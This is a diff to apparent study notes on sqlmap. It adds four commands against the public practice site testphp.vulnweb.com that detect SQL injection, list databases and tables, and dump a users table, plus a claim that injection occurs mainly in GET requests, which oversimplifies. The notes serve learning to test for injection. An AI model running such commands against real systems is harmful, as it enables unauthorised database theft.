@@ -23,8 +23,25 @@ I have listed some important commands from Sqlmap are listed below.
 
 ---
 
-### I have added practical task from tryhackme lab :
--see screenshots below.
+- Sql injection happen in GET request so if web application contains GET request there may be high chances of SQL injection vulnerability.
+- I have added simple steps below regarding Sqlmap tool see below
+
+
+---
+
+
+# Step 1: Check if vulnerable
+sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1"
+
+# Step 2: List all databases
+sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" --dbs
+
+# Step 3: List tables from a database
+sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart --tables
+
+# Step 4: Dump data from users table
+sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart -T users --dump
+
 
 
 
